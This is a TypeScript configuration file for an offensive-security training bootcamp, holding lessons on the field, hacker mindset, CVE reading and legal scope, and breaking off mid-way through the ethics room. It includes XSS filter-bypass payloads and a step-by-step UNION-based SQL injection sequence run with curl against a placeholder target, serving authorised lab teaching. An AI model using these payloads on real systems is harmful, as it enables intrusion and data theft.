/**
 * HACKER PROTOCOL BOOTCAMP — STATIC CONFIG (IMPROVED)
 * =====================================================
 * Single source of truth for the bootcamp walkthrough structure.
 * MUST mirror the backend bootcamp.config.js exactly.
 *
 * Instruction format supports:
 *   - Fenced code blocks:  \`\`\`bash\ncommand\n\`\`\`
 *   - Inline code:         `command`
 *   - Plain prose
 *
 * Image rules:
 *   - Existing steps: original filename preserved
 *   - New steps added during this revision: image set to null (add manually)
 */

export interface BootcampStep {
  title: string;
  instruction: string;
  /** Exact filename from the filesystem. null = no image yet → show placeholder. */
  image: string | null;
}

export interface BootcampRoom {
  id: string;
  title: string;
  overview: string;
  estimatedMinutes: number;
  steps: BootcampStep[];
}

export interface BootcampPhase {
  id: string;
  title: string;
  codename: string;
  rooms: BootcampRoom[];
}

export interface BootcampConfig {
  id: string;
  title: string;
  phases: BootcampPhase[];
}

// ── Image path builder ────────────────────────────────────────────────────────
export function buildStepImagePath(
  phaseId: string,
  roomId: string,
  filename: string
): string {
  if (filename.startsWith('http://') || filename.startsWith('https://')) {
    return filename;
  }

  const phaseMatch = phaseId.match(/\d+/);
  const roomMatch = roomId.match(/\d+/);
  const phaseNum = phaseMatch ? Number(phaseMatch[0]) : 0;
  const roomNum = roomMatch ? Number(roomMatch[0]) : 0;
  const phaseDir = `phase-${String(phaseNum).padStart(2, '0')}`;
  const roomDir = `room-${String(roomNum).padStart(2, '0')}`;

  const normalized = filename.trim().toLowerCase().replaceAll('_', '-');
  const withStepPrefix = /^step-\d{2}-/.test(normalized)
    ? normalized
    : normalized.replace(/^(\d+)-/, (_m, n) => `step-${String(Number(n)).padStart(2, '0')}-`);

  const encoded = withStepPrefix
    .split('/')
    .map((part) => encodeURIComponent(part))
    .join('/');

  return `/walkthrough/hpb/${phaseDir}/${roomDir}/${encoded}`;
}

// ── Config ────────────────────────────────────────────────────────────────────
export const BOOTCAMP_CONFIG: BootcampConfig = {
  id: 'hpb',
  title: 'Hacker Protocol Bootcamp',
  phases: [

    // ═══════════════════════════════════════════════════════════════════════════
    // PHASE 1 — HACKER MINDSET
    // ═══════════════════════════════════════════════════════════════════════════
    {
      id: 'phase1',
      title: 'Hacker Mindset',
      codename: 'PHASE 1',
      rooms: [

        // ── Room 1 ─────────────────────────────────────────────────────────────
        {
          id: 'room1',
          title: 'Introduction to Offensive Security',
          overview:
            'Offensive security is the practice of thinking and acting like an attacker — with permission — to find weaknesses before real adversaries do. This room explains what the field is, why it exists, the disciplines it contains, and how HSOCIETY fits into the professional landscape.',
          estimatedMinutes: 35,
          steps: [
            {
              title: 'What Is Offensive Security?',
              instruction:
                `Offensive security — also called red teaming or ethical hacking — is the discipline of proactively attacking systems, networks, and applications to discover vulnerabilities before malicious actors do. The key word is **proactively**: you are not waiting for an attack to happen; you are simulating one under controlled, authorised conditions.

The field sits on the opposite side of defensive security (blue teaming), which focuses on detection, response, and hardening. Both sides depend on each other: defenders need to understand what attackers do, and attackers need to understand what defenders look for. The best professionals develop fluency in both.

**The core disciplines of offensive security:**

- **Penetration Testing** — A scoped, time-boxed engagement in which a tester is hired to find and report vulnerabilities in a specific target. Results are documented in a formal report with findings and remediation steps. This is the most common entry point into the profession.

- **Red Teaming** — A longer, more realistic simulation of a full adversary campaign. Unlike a penetration test, which focuses on finding as many vulnerabilities as possible, red teaming simulates the behaviour of a specific threat actor with a specific objective (e.g. "steal the company's financial data"). The blue team often does not know the red team is operating.

- **Bug Bounty Hunting** — Independently finding vulnerabilities in programmes run by companies like Google, Microsoft, Apple, and Meta through platforms like HackerOne and Bugcrowd. Income varies but is uncapped, and top hunters earn six figures annually.

- **Vulnerability Research** — Discovering new, previously unknown vulnerabilities (zero-days) in software or hardware. This requires deep technical knowledge and is often conducted at security firms, universities, or government agencies.

- **Capture The Flag (CTF)** — Competitive events where participants solve security challenges to find hidden flags. CTFs are how most professionals build their skills before entering the industry.

- **Purple Teaming** — A collaborative model where red and blue teams work together in real time to improve detection and response. Rather than an adversarial exercise, it is a training exercise for both sides.

**Offensive vs Defensive Security at a glance:**

| Aspect | Offensive (Red) | Defensive (Blue) |
|---|---|---|
| Goal | Find vulnerabilities | Detect and stop attacks |
| Mindset | "How do I break this?" | "How do I protect this?" |
| Key tools | Nmap, Burp Suite, Metasploit | SIEM, IDS/IPS, EDR |
| Output | Penetration test report | Incident report, threat model |
| Career titles | Pentester, red team operator | SOC analyst, threat hunter |

**Why organisations pay people to attack their own systems:**

The answer is simple — it is far cheaper to find a vulnerability before an attacker does than after. The average cost of a data breach in 2024 was over $4 million. A penetration test costs a fraction of that. Organisations also face regulatory requirements: PCI-DSS (payment card industry), ISO 27001, SOC 2, and many government frameworks mandate regular penetration testing.

**Exercise:** In your notes, write a paragraph explaining the difference between offensive and defensive security in your own words — without copying from this material. Then write one sentence explaining why a company would pay someone to attack their own systems, and one sentence explaining what would happen if they did not.`,
              image: '01-intro.png',
            },
            {
              title: 'The HSOCIETY Operating Model',
              instruction:
                `HSOCIETY is built on three pillars: **Education**, **Execution**, and **Community**. Understanding this model tells you exactly what you are training for, how the programme is structured, and what success looks like after you graduate.

**Pillar 1 — Education**

This is where you are now. The bootcamp delivers the technical foundation, the methodology, and the mindset from first principles. No prior experience is assumed. Every concept is built from the ground up — from how packets move across a network to how a SQL injection payload breaks out of a database query.

The education pillar is structured in phases that mirror the real-world offensive security workflow:
1. Mindset and ethics — understanding how to think and operate legally
2. Linux foundations — the operating environment for every tool you will use
3. Networking — understanding what you are attacking before you attack it
4. Web and backend systems — the most common attack surface in modern engagements
5. Social engineering — targeting the human element

**Pillar 2 — Execution**

After the bootcamp, you apply what you have learned in real engagements. Execution happens in three stages:

- **Stage 1: CTF competitions** — structured challenges that test specific skills in a safe environment. Your scores are tracked on the HSOCIETY leaderboard.
- **Stage 2: Bug bounty programmes** — real targets, real vulnerabilities, real rewards. You operate under programme rules on platforms like HackerOne and Bugcrowd.
- **Stage 3: Client engagements** — if you reach this stage, you are conducting real penetration tests for real organisations, producing professional deliverables.

**Pillar 3 — Community**

Offensive security is not a solo discipline. The HSOCIETY community is where you:
- Share findings and techniques with other operators
- Ask questions and get answers from people who have solved the same problems
- Collaborate on CTF challenges
- Build the reputation that gets you hired

**Exercise:** Write down what each pillar means to you personally — and be specific. Not "I want to learn hacking" but a concrete, measurable goal for each pillar. For example: "In the Education pillar, I want to be able to conduct a web application penetration test independently within six months." Write three goals, one per pillar.`,
              image: '02-model.png',
            },
            {
              title: 'Career Paths in Offensive Security',
              instruction:
                `The offensive security field has several distinct career paths. Knowing which one interests you helps you focus your learning and build the right portfolio. Here is a detailed breakdown of each path, including what the day-to-day work looks like and what skills are required.

**Penetration Tester**

The most common entry point. Penetration testers work either for a consultancy (conducting tests for multiple clients) or in-house (testing their own organisation's systems). A typical engagement runs one to two weeks and produces a written report.

Day-to-day work includes:
- Scoping calls with clients to define the rules of engagement
- Conducting reconnaissance, scanning, and exploitation
- Writing detailed findings with proof-of-concept code and screenshots
- Presenting results to technical and non-technical stakeholders

Key certifications: OSCP (Offensive Security Certified Professional), CEH, eJPT, CompTIA PenTest+

**Red Team Operator**

Red teamers simulate advanced persistent threats (APTs) — nation-state or sophisticated criminal actors. Engagements run weeks or months, with the blue team unaware. The goal is not to find every vulnerability but to achieve a specific objective without being detected.

Skills required: custom malware development, Active Directory attacks, command-and-control infrastructure, physical access, social engineering.

Key certifications: CRTO (Certified Red Team Operator), CRTE, OSEP

**Bug Bounty Hunter**

Works independently, finding vulnerabilities in public programmes. Income is variable — a critical vulnerability might pay $10,000 or more; a low-severity finding might pay $150. Top hunters treat it as a full-time job with a specific methodology applied consistently across programmes.

Key skills: web application testing, API testing, mobile application testing, report writing.

**Security Researcher**

Discovers new vulnerability classes, writes exploits, and publishes research. Often works at security firms (Google Project Zero, Trend Micro ZDI), universities, or independently. Requires deep technical knowledge — binary exploitation, reverse engineering, fuzzing.

**CTF Player / Content Creator**

Competes in Capture The Flag competitions. Many professionals combine CTF with content creation (writeups, YouTube, blog posts), building a public reputation that leads to job offers. CTF is also a legitimate career path in itself — some players are sponsored to compete full-time.

**Salary ranges (approximate, varies by region):**

| Role | Entry | Mid | Senior |
|---|---|---|---|
| Junior Pentester | $50k–$70k | — | — |
| Penetration Tester | — | $80k–$120k | $120k–$160k |
| Red Team Operator | — | $100k–$140k | $150k–$200k+ |
| Bug Bounty (top 1%) | — | — | $200k–$500k+ |

**Exercise:** Rank these paths from most to least interesting to you and write two sentences explaining each ranking position. This is not a permanent decision — it is a starting point for focusing your learning.`,
              image: '03-roles.png',
            },
            {
              title: 'The Offensive Security Methodology',
              instruction:
                `Every professional penetration test follows a structured methodology. Understanding this framework before you learn the individual techniques helps you see how everything fits together. The methodology is the same whether you are testing a web application, a network, or a physical facility.

**The five phases of a penetration test:**

**Phase 1 — Reconnaissance (Recon)**

Gathering information about the target without touching it. This phase is entirely passive — you are not sending any packets to the target. Sources include:
- Public websites and social media
- WHOIS and DNS records
- Job postings (which reveal technology stack)
- LinkedIn (which reveals employees and organisational structure)
- Google dorking (finding exposed files and pages)
- Shodan (finding internet-connected devices)

Recon can also be active — sending packets to the target to gather information. Active recon includes port scanning and banner grabbing. Active recon must always be within the authorised scope.

**Phase 2 — Scanning and Enumeration**

Systematically mapping the target's attack surface. This includes:
- Port scanning (finding open ports and services)
- Service version detection (identifying what software is running)
- Vulnerability scanning (checking known CVEs against detected versions)
- Web application enumeration (finding directories, parameters, and endpoints)

**Phase 3 — Exploitation**

Using vulnerabilities discovered in the previous phase to gain unauthorised access. This is what most people think of when they hear "hacking." In reality, it is a small fraction of the total time spent on an engagement.

**Phase 4 — Post-Exploitation**

After gaining initial access, the operator works to:
- Establish persistence (maintain access if the initial foothold is lost)
- Escalate privileges (move from a low-privileged user to root or administrator)
- Lateral movement (pivot from the compromised system to other systems on the network)
- Exfiltrate data (demonstrate the impact of the compromise)

**Phase 5 — Reporting**

The deliverable. Every finding is documented with:
- Title and severity rating
- Detailed description of the vulnerability
- Step-by-step proof of concept (how to reproduce it)
- Impact (what an attacker could do with it)
- Remediation (how to fix it)

**The methodology visualised:**

\`\`\`
Reconnaissance → Scanning/Enumeration → Exploitation → Post-Exploitation → Reporting
       ↑                                                                        |
       └────────────────────── Iterate (new information loops back) ───────────┘
\`\`\`

**Exercise:** Draw this methodology from memory as a flowchart. Under each phase, write two examples of tools or techniques that belong to it. You will encounter every one of these phases in this bootcamp — knowing where each technique fits helps you build a coherent picture.`,
              image: null,
            },
            {
              title: 'Setting Up Your Learning Environment',
              instruction:
                `Before you begin the practical sections of this bootcamp, you need a working offensive security lab. This step walks you through exactly what to set up and why.

**Why you need a local lab:**

You will be practising attacks that are illegal to use against systems you do not own. A local lab gives you targets you control, where you can practise freely without legal risk. It also means you are not dependent on an internet connection for every exercise.

**Required components:**

**1. A virtualisation platform**

You will run multiple virtual machines (VMs) simultaneously. Install one of the following:

\`\`\`bash
# VirtualBox (free, cross-platform — recommended for beginners)
# Download from: https://www.virtualbox.org

# VMware Workstation Pro (paid, better performance)
# Download from: https://www.vmware.com

# KVM/QEMU (Linux only, best performance on Linux hosts)
sudo apt install qemu-kvm virt-manager libvirt-daemon-system
sudo usermod -aG libvirt $(whoami)
sudo usermod -aG kvm $(whoami)
\`\`\`

**2. Kali Linux (your attack machine)**

Kali Linux is the industry-standard penetration testing distribution. It comes pre-installed with hundreds of security tools.

\`\`\`bash
# Download the VirtualBox/VMware image from:
# https://www.kali.org/get-kali/#kali-virtual-machines

# Default credentials (change these immediately after first boot):
# Username: kali
# Password: kali

# After first boot, update the system:
sudo apt update && sudo apt full-upgrade -y

# Install any missing tools you need:
sudo apt install -y \
  nmap \
  gobuster \
  ffuf \
  sqlmap \
  hydra \
  john \
  hashcat \
  burpsuite \
  wireshark \
  metasploit-framework \
  netcat-traditional
\`\`\`

**3. Vulnerable target machines**

You need something to practise against. The following are deliberately vulnerable machines designed for learning:

\`\`\`bash
# Metasploitable 2 (classic vulnerable Linux target)
# Download from: https://sourceforge.net/projects/metasploitable/

# DVWA (Damn Vulnerable Web Application)
# Run with Docker:
docker pull vulnerables/web-dvwa
docker run -d -p 80:80 vulnerables/web-dvwa

# VulnHub (hundreds of downloadable vulnerable VMs)
# Browse at: https://www.vulnhub.com

# Hack The Box (online labs — free tier available)
# Register at: https://www.hackthebox.com

# TryHackMe (guided rooms — excellent for beginners)
# Register at: https://tryhackme.com
\`\`\`

**4. Network isolation — critical**

Your lab VMs must be on an isolated network. If a vulnerable VM is on your regular network, other devices on that network are at risk.

\`\`\`bash
# In VirtualBox: set each VM's network adapter to "Host-Only" or "Internal Network"
# This prevents the vulnerable VMs from reaching the internet or your other devices

# Verify your Kali machine can reach the target but not the internet:
ping 8.8.8.8          # Should fail (no internet)
ping 192.168.56.101   # Should succeed (your target VM)
\`\`\`

**Exercise:** Set up your lab environment. Take a screenshot of your VirtualBox/VMware showing both your Kali VM and at least one target VM running. Verify that Kali can ping the target. Document the IP addresses of each machine — you will use these throughout the bootcamp.`,
              image: null,
            },
            {
              title: 'How to Use This Bootcamp Effectively',
              instruction:
                `Before you move through the technical content, understand how to extract maximum value from this programme. The difference between operators who excel and those who stagnate is almost never raw intelligence — it is how they practise.

**The three learning modes:**

**Mode 1 — Passive reading (lowest value)**
Reading the instruction, understanding it conceptually, and moving on. This feels productive but produces almost no retention and zero practical skill. You cannot become a penetration tester by reading about penetration testing any more than you can become a surgeon by reading about surgery.

**Mode 2 — Active following (medium value)**
Running every command as you read it. Observing the output. Forming a mental model of what each command does and why. This is the minimum standard for every step in this bootcamp.

**Mode 3 — Active reconstruction (highest value)**
After completing a room, close the instructions and try to accomplish the same tasks from memory. When you get stuck, note exactly what you could not remember — that is the gap in your knowledge. Research it. Then try again. This is how skills become instincts.

**Note-taking methodology:**

Every operator maintains notes. Notes serve two purposes: they help you learn, and they become your personal methodology reference for future engagements.

A good note-taking structure for each topic:

\`\`\`
## Topic: [e.g. SQL Injection]

### What it is
One paragraph in your own words — no copying.

### Why it matters
What can an attacker do if this vulnerability exists?

### How to find it
Specific steps, indicators, and test payloads.

### How to exploit it
Commands and examples from your own practice.

### How to fix it
Developer-facing remediation.

### References
Links to deeper reading, CVEs, tools.
\`\`\`

Recommended tools for notes: Obsidian, Notion, CherryTree (popular with pentesters), or plain markdown files in a git repository.

**Time management:**

Each room has an estimated time. These estimates assume you are running every command, taking notes, and doing every exercise. If you finish significantly faster, you have not done the exercises. If you finish significantly slower, identify which concept slowed you down and spend extra time on it before moving on.

**The #1 rule:** Never copy and paste commands you do not understand. Type them manually. Read every flag. Look up anything you do not recognise. Operators who blindly copy commands become dangerous — to their clients, and potentially to themselves legally.

**Exercise:** Set up your note-taking system right now, before moving to the next step. Create a folder structure that mirrors this bootcamp's phase and room structure. Open a blank note for this room and write a two-sentence summary of everything you have learned so far.`,
              image: null,
            },
          ],
        },

        // ── Room 2 ─────────────────────────────────────────────────────────────
        {
          id: 'room2',
          title: 'The Hacker Mindset',
          overview:
            'The most important tool you will ever develop is not a piece of software — it is how you think. This room breaks down the cognitive traits that separate effective operators from people who just run tools, and gives you practical exercises to begin developing each one.',
          estimatedMinutes: 30,
          steps: [
            {
              title: 'The Three Core Traits',
              instruction:
                `Every effective operator shares three cognitive traits. These are not personality types you are born with — they are habits you develop through deliberate practice. Understanding them conceptually is the first step. Building them requires the exercises throughout this bootcamp.

**Trait 1 — Curiosity**

The drive to understand how things work, not just that they work. When a curious operator sees a login form, they do not just type a username and password — they ask: What database is behind this? What framework built this application? What happens if I send a single quote? What happens if the password field is 10,000 characters long? What happens if I change the request method from POST to GET?

Curiosity is what makes you look one layer deeper than everyone else. Most security vulnerabilities exist because developers did not ask "what if someone does something unexpected with this?" Operators ask that question about everything.

**Trait 2 — Persistence**

The ability to keep working on a problem after the first approach fails. And the second. And the fifth. Most attacks fail on the first attempt. Version-specific exploits do not work on patched systems. Payloads get filtered. Ports are firewalled. The operator who finds the vulnerability is often the one who tried one more variation.

Persistence is also what separates good reports from great reports. Anyone can find an obvious SQL injection. The operators who find the critical logic flaw buried three levels deep in the application are the ones who kept poking after everyone else moved on.

**Trait 3 — Lateral Thinking**

The ability to approach a problem from an unexpected angle. Security controls are designed to stop expected attacks. Lateral thinking is how you find the path the defender did not anticipate.

A classic example: a web application filters out `<script>` tags to prevent XSS. A tool runner moves on. An operator with lateral thinking asks: what other ways are there to execute JavaScript? They try `<img src=x onerror=alert(1)>`. They try `<svg onload=alert(1)>`. They try `javascript:alert(1)` in a URL field. They try injecting into an existing JavaScript context without any HTML tags at all. The filter stops one technique. Lateral thinking finds nine others.

**Exercise:** For each trait, write a concrete example of how it would apply in a real engagement scenario. Use a web application penetration test as your context. Do not use generic examples — describe a specific vulnerability class, a specific test, and a specific observation. Aim for at least a paragraph per trait.`,
              image: '01-mindset.png',
            },
            {
              title: 'Applying the Mindset',
              instruction:
                `The hacker mindset is not something you switch on during an engagement — it is a way of observing the world. You can practise it right now, without any tools, against any system you encounter in daily life.

**The Five Questions Framework:**

Pick any object, system, or application near you. It could be a door lock, a vending machine, a mobile banking app, a website you use daily, or even the bootcamp platform you are using right now. Apply these five questions to it:

**1. How was this built?**
What assumptions did the designer make about how it would be used? What technology is behind it? What components make it work?

**2. What is the intended use?**
What is the system designed to do? What behaviour does it expect from users?

**3. What is the unintended use?**
What can it do that the designer did not intend? What happens if you use it in a way that was not designed for?

**4. What does it trust?**
What inputs does it accept without verification? What data does it assume is safe? What users does it assume are legitimate?

**5. What happens at the boundary?**
What happens when you give it input that is too long, too short, in the wrong format, or entirely unexpected? What happens at the edges of its design?

**Worked example — a web application login form:**

1. **How was it built?** Likely PHP or Python backend, SQL database, session cookies for authentication. The developer probably used a framework — but which one, and what version?

2. **What is the intended use?** A user enters a username and password. The server checks them against the database. If they match, the server issues a session cookie and redirects to the dashboard.

3. **What is the unintended use?** What if the username contains a single quote? What if the password is 50,000 characters? What if I send the request without a password field at all? What if I send the same request 1,000 times in a second?

4. **What does it trust?** It trusts that the username and password are normal strings. It may trust that the `X-Forwarded-For` header reflects the user's real IP. It trusts that requests come from the browser, not from a script.

5. **What happens at the boundary?** Single quote → potential SQL injection. 50,000 character password → potential denial of service or buffer overflow. Missing password field → potential logic flaw. 1,000 requests/second → test for rate limiting.

**Exercise:** Choose a web application you use regularly (with permission to probe it). Apply all five questions to its login page. Write detailed answers — minimum three observations per question. This is not a test; no one else will see it. The goal is to train the habit of systematic analysis.`,
              image: '02-apply.png',
            },
            {
              title: 'Tools vs. Understanding',
              instruction:
                `There is a critical distinction between someone who runs tools and someone who understands what those tools do. This distinction determines your ceiling as an operator, your value to clients, and your ability to adapt when tools fail — which they will.

**The tool runner:**

Opens Metasploit, searches for an exploit matching the target's version, runs it. If it works, they log the finding. If it does not work, they move on. They cannot explain to a client why the vulnerability exists. They cannot adapt the exploit for a slightly different version. They cannot find the same class of vulnerability when it is in a context that no existing tool covers. And critically, they cannot tell the difference between a true negative (vulnerability does not exist) and a false negative (their tool did not detect it).

**The operator:**

Understands the underlying vulnerability — the memory corruption, the logic flaw, the missing sanitisation, the misconfiguration. They can replicate the attack manually, step by step, because they know what each step is doing at the protocol level. They can adapt the attack to a different target, a different environment, a different version. They can explain it clearly in a written report and in a verbal presentation to a non-technical client. And they can find vulnerabilities that no existing tool covers, because they are not limited to what tools can see.

**A concrete example — SQL injection:**

Tool runner approach:
\`\`\`bash
# Runs sqlmap and waits for output
sqlmap -u "http://target.com/product?id=1" --dbs
\`\`\`

Operator approach:
\`\`\`bash
# Step 1: Manually test for injection with a single quote
curl "http://target.com/product?id=1'"

# Observes: 500 Internal Server Error with database error message
# Conclusion: input is not sanitised, likely injected directly into SQL query

# Step 2: Determine number of columns with ORDER BY
curl "http://target.com/product?id=1 ORDER BY 1--"   # 200 OK
curl "http://target.com/product?id=1 ORDER BY 2--"   # 200 OK
curl "http://target.com/product?id=1 ORDER BY 3--"   # 500 Error → 2 columns

# Step 3: Find which column is reflected in output
curl "http://target.com/product?id=1 UNION SELECT 'TESTSTRING1','TESTSTRING2'--"

# Step 4: Extract the database version
curl "http://target.com/product?id=1 UNION SELECT @@version,NULL--"

# Step 5: Extract the database name
curl "http://target.com/product?id=1 UNION SELECT database(),NULL--"

# Step 6: Extract table names
curl "http://target.com/product?id=1 UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--"
\`\`\`

The operator ran sqlmap too — but after understanding the vulnerability manually. Now when sqlmap produces an unexpected result, they know why. When it fails on an edge case, they can work around it.

**The goal of this bootcamp** is to make you an operator. Every tool you use in this programme, you will understand from first principles before you use it. You will know what it does, why it works, and how to replicate its core function manually.

**Exercise:** Think about a tool you have used before (even outside security — it could be any software). Write a paragraph describing what it does at a mechanical level — not just "it scans ports" but what packets it sends, what responses it looks for, and how it interprets those responses. If you cannot answer that question, you are using it as a tool runner. Identify one tool you want to understand at the operator level by the end of this bootcamp.`,
              image: '03-discuss.png',
            },
            {
              title: 'Developing a Hacker Vocabulary',
              instruction:
                `Precision in language matters. When you read a CVE, a vulnerability report, or a tool's documentation, you will encounter terms that have specific technical meanings. Using them correctly makes you a more effective researcher, a more credible professional, and a better communicator in client reports.

**Core terminology every operator must know:**

**Vulnerability** — A weakness in a system that can be exploited. Examples: a SQL injection flaw, a misconfigured S3 bucket, an outdated library with a known CVE.

**Exploit** — Code or a technique that takes advantage of a vulnerability to produce a specific result (e.g. gain code execution, extract data). Not every vulnerability has a public exploit.

**Payload** — The code or data delivered by an exploit that performs the actual malicious action. In Metasploit, you choose an exploit (the delivery mechanism) and a payload (what happens after delivery).

**Attack Vector** — How the attacker reaches the vulnerability. Common vectors: network (remote), adjacent network (requires LAN access), local (requires a shell), physical (requires physical access).

**Attack Surface** — The total set of entry points where an attacker could try to enter or extract data from an environment. Reducing attack surface is a key principle of secure design.

**Zero-Day (0-day)** — A vulnerability that is unknown to the vendor and has no available patch. When a zero-day is sold or disclosed, the clock starts — from that moment, it is a "known" vulnerability.

**CVE (Common Vulnerabilities and Exposures)** — A standardised identifier for publicly known vulnerabilities. Format: CVE-YEAR-NUMBER. Example: CVE-2021-44228 (Log4Shell). Look up CVEs at nvd.nist.gov.

**CVSS (Common Vulnerability Scoring System)** — A numerical score (0–10) representing a vulnerability's severity. Version 3.1 is current. Scores map to: Critical (9–10), High (7–8.9), Medium (4–7), Low (0.1–3.9).

**PoC (Proof of Concept)** — A minimal demonstration that a vulnerability exists and is exploitable. A good PoC is reproducible by anyone following the documented steps.

**Privilege Escalation (PrivEsc)** — Gaining a higher level of access than initially granted. Horizontal: gaining access to another user at the same privilege level. Vertical: gaining a higher privilege level (e.g. regular user → root).

**Lateral Movement** — After compromising one system, moving to other systems on the same network using the access and credentials obtained.

**Persistence** — Mechanisms that allow an attacker to maintain access to a compromised system after reboots, credential changes, or patch deployments.

**C2 / C&C (Command and Control)** — The infrastructure through which an attacker communicates with compromised systems. Malware "phones home" to the C2 server to receive instructions.

**Exercise:** Without looking back at the definitions, write a brief scenario of a penetration test engagement (3–5 paragraphs) that naturally uses at least eight of these terms correctly in context. This forces you to internalise the vocabulary rather than just memorise definitions.`,
              image: null,
            },
            {
              title: 'Reading CVEs and Security Advisories',
              instruction:
                `One of the most important skills an operator develops is the ability to read a CVE or security advisory and immediately understand its significance. This is how you stay current with the threat landscape and how you research vulnerabilities during an engagement.

**Anatomy of a CVE entry (using CVE-2021-44228, Log4Shell, as an example):**

\`\`\`
CVE ID:         CVE-2021-44228
Description:    Apache Log4j2 2.0-beta9 through 2.14.1 does not protect
                against attacker-controlled LDAP and other JNDI-related
                endpoints. An attacker who can control log messages or
                log message parameters can execute arbitrary code loaded
                from LDAP servers when message lookup substitution is enabled.

CVSS Score:     10.0 (Critical)
Attack Vector:  Network
Attack Complexity: Low
Privileges Required: None
User Interaction: None
Scope:          Changed

Affected:       Apache Log4j 2.0-beta9 through 2.14.1
Fixed in:       Apache Log4j 2.15.0 and later
Published:      2021-12-10
\`\`\`

**What each field tells an operator:**

- **CVSS 10.0** — Maximum severity. This is as bad as it gets.
- **Attack Vector: Network** — Exploitable remotely, no physical access required.
- **Attack Complexity: Low** — No special conditions needed. The attack is reliable and repeatable.
- **Privileges Required: None** — The attacker does not need an account on the system.
- **User Interaction: None** — No victim action needed (e.g. no clicking a link).
- **Scope: Changed** — Exploitation can impact resources beyond the vulnerable component.

**Where to research CVEs:**

\`\`\`bash
# National Vulnerability Database (authoritative)
https://nvd.nist.gov/vuln/detail/CVE-2021-44228

# Exploit Database (searchable, includes PoC code)
https://www.exploit-db.com

# Search from the command line with searchsploit
searchsploit log4j
searchsploit apache 2.4.41

# GitHub — many researchers publish PoC code here
# Search: "CVE-2021-44228 PoC" on github.com

# Vendor advisories — the authoritative source for patches
# Example: https://logging.apache.org/log4j/2.x/security.html
\`\`\`

**Reading a security advisory efficiently:**

When you are in an engagement and need to research a vulnerability quickly, follow this order:
1. Read the title and CVSS score — is this worth pursuing?
2. Read the affected versions — does the target version match?
3. Read the attack vector — can you reach this from your current position?
4. Read the PoC or references — has this been publicly weaponised?
5. Read the remediation — what would an alert blue team have done to stop this?

**Exercise:** Look up CVE-2017-0144 (EternalBlue) on nvd.nist.gov. Write a one-page analysis covering: what the vulnerability is, what the CVSS score is and what each component of the score means, what systems are affected, what a real attacker did with it (research the WannaCry campaign), and what a penetration tester would look for to determine whether a target is still vulnerable.`,
              image: null,
            },
          ],
        },

        // ── Room 3 ─────────────────────────────────────────────────────────────
        {
          id: 'room3',
          title: 'Ethics & Legal Boundaries',
          overview:
            'Operating without authorisation is a criminal offence in every jurisdiction without exception. This room covers the legal framework, the concept of scope, responsible disclosure, and the professional standards that separate ethical hackers from criminals.',
          estimatedMinutes: 35,
          steps: [
            {
              title: 'The Legal Framework',
              instruction:
                `Offensive security without written authorisation is a criminal offence. This is not a grey area, and it does not matter whether your intent was benign. The law cares about the act, not the motivation — "I was just testing their security" is not a legal defence.

**United Kingdom — The Computer Misuse Act 1990 (CMA)**

The CMA is the primary legislation governing computer crime in the UK. It has three main offences:

- **Section 1 — Unauthorised access:** Accessing a computer system without permission. This includes port scanning, attempting to log in, or browsing a website to extract data in an unauthorised manner. Maximum sentence: 2 years imprisonment.

- **Section 2 — Unauthorised access with intent to commit further offences:** Section 1 with the intention of committing another crime (e.g. accessing a system to steal data, commit fraud, or plant malware). Maximum sentence: 5 years imprisonment.

- **Section 3 — Unauthorised modification:** Altering, deleting, or corrupting data without permission. This includes deploying malware, defacing a website, or modifying configuration files. Maximum sentence: 10 years imprisonment.

- **Section 3ZA — Unauthorised acts causing serious damage:** Attacks on critical national infrastructure (CNI) — hospitals, power grids, water systems. Maximum sentence: life imprisonment.

**United States — The Computer Fraud and Abuse Act (CFAA)**

The CFAA (18 U.S.C. § 1030) is the primary federal computer crime statute. It is broad and has been applied aggressively. Key provisions:

- Unauthorised access to a protected computer: up to 5 years imprisonment (first offence)
- Accessing a computer to commit fraud: up to 5 years
- Causing damage to a computer: up to 10 years
- Repeat offences or serious damage: up to 20 years

The CFAA's definition of "unauthorised access" has been contested in courts — the Supreme Court ruled in Van Buren v. United States (2021) that accessing data you are technically permitted to access but for an unauthorised purpose may not violate the CFAA. However, any access outside the scope of a signed authorisation is still extremely high risk legally.

**European Union — Directive 2013/40/EU**

Criminalises illegal access, illegal system interference, and illegal data interference across all EU member states. Each member state implements this through its own legislation. Penalties vary by country.

**The key principle in every jurisdiction:**

Authorisation is the absolute line between legal security testing and criminal hacking. The technical actions are identical. A port scan from a penetration tester with a signed scope of work is legal professional activity. The same port scan from someone without authorisation is a criminal offence. Only the paperwork differs.

**Exercise:** Research the specific computer crime legislation that applies in your country or jurisdiction. Write down: the law's name, the key offences, and their maximum penalties. You are personally responsible for knowing this. If you are unsure, consult a legal professional.`,
              image: '/assets/bootcamp/rooms/ethics-legal-framework.jpg',
            },
            {
              title: 'Scope and Authorisation',
              instruction:
                `In every professional engagement, **scope** defines exactly what you are and are not permitted to test. It is documented in writing before any testing begins, signed by a representative of the target organisation with authority to authorise testing. Without this document, you have no legal protection.

**What a scope document contains:**

A properly written scope of work or rules of engagement includes all of the following:

- **In-scope targets:** Specific IP ranges, CIDR blocks, domain names, or application URLs that you are explicitly permitted to test. Example: `192.168.10.0/24`, `app.company.com`, `api.company.com`

- **Out-of-scope targets:** Systems you must not touch, even if you encounter them during testing. Often includes production databases, third-party services, and systems belonging to other companies that share infrastructure. Example: `paymentgateway.thirdparty.com`

- **Permitted techniques:** What types of testing are allowed. Common restrictions include: no denial-of-service testing, no phishing of real employees, no physical access attempts, no testing during business hours. Some clients permit everything; most have restrictions.

- **Testing window:** The specific dates and times during which testing is authorised. Testing outside this window — even on in-scope targets — is not authorised.

- **Data handling:** What happens to any data you find during testing. Most scope documents prohibit exfiltrating real customer data, even as proof of concept.

- **Emergency contacts:** Who to call immediately if you accidentally cause an outage, find a critical breach in progress, or discover evidence of an existing compromise.

**What happens when you go out of scope:**

\`\`\`
Scenario: You are testing company.com. During a port scan, you discover
that company.com resolves to a shared hosting provider. You begin testing
the server and find a vulnerability that affects other websites on the
same server.

Legal situation: The authorisation covers company.com. You are now testing
systems belonging to other companies who never authorised you. Even though
you reached them through a legitimate entry point, you are in criminal territory.

Correct action: Stop immediately. Document exactly what you discovered and
how. Contact the client's emergency contact. Let them decide how to proceed.
Do not touch anything beyond your documented scope.
\`\`\`

**The authorisation chain:**

The person who signs the scope document must have the authority to authorise security testing. A junior employee saying "yeah, go ahead" is not sufficient. You need written sign-off from a senior technical officer (CTO, CISO) or a legal representative of the company. If you are ever in doubt, ask for the authorisation to be confirmed by someone senior.

